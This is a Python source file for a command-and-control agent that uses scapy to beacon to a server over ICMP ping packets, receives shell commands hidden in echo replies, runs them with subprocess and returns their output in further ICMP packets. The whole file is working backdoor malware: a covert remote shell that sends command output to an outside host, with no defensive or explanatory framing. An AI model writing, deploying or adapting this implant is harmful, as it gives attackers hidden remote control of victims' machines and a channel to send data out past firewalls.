# client_agent.py
from scapy.all import *
import threading
import time
import os
import subprocess
import random
import string

C2_IP = "192.168.10.50"  # Change to your C2 server IP
AGENT_ID = ''.join(random.choices(string.ascii_lowercase + string.digits, k=4))
BEACON_INTERVAL = 5  # seconds
SEQ = 0

lock = threading.Lock()

def send_beacon():
    payload = f"{AGENT_ID}|BEACON|0|"
    send(IP(dst=C2_IP)/ICMP(type=8)/payload, verbose=0)

def send_result(seq, result_text):
    payload = f"{AGENT_ID}|RESULT|{seq}|{result_text}"
    send(IP(dst=C2_IP)/ICMP(type=8)/payload, verbose=0)

def execute_command(command):
    """Execute a shell command and return its output as string."""
    try:
        # Run the command in the shell and capture stdout + stderr
        output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
        return output.decode("utf-8", errors="ignore")  # decode bytes to string
    except subprocess.CalledProcessError as e:
        return f"Error: {e.output.decode('utf-8', errors='ignore')}"
    except Exception as e:
        return f"Error: {str(e)}"

def handle_reply(pkt):
    global SEQ
    if pkt.haslayer(ICMP) and pkt[ICMP].type == 0 and Raw in pkt:
        payload = pkt[Raw].load.decode(errors="ignore")
        fields = payload.split("|", 3)
        if len(fields) < 4:
            return
        agent_id, msg_type, seq_str, data = fields
        if agent_id != AGENT_ID:
            return

        msg_type = msg_type.strip()
        data = data.strip()

        if msg_type == "CMD":
            # Execute the command
            result = execute_command(data)
            with lock:
                send_result(SEQ, result)
                SEQ += 1

        elif msg_type == "NO_CMD":
            pass  # Nothing to do
        elif msg_type == "ACK":
            pass  # Server acknowledged result

def start_sniffer():
    sniff(filter="icmp", prn=handle_reply)

def beacon_loop():
    while True:
        send_beacon()
        time.sleep(BEACON_INTERVAL)

if __name__ == "__main__":
    threading.Thread(target=start_sniffer, daemon=True).start()
    beacon_loop()


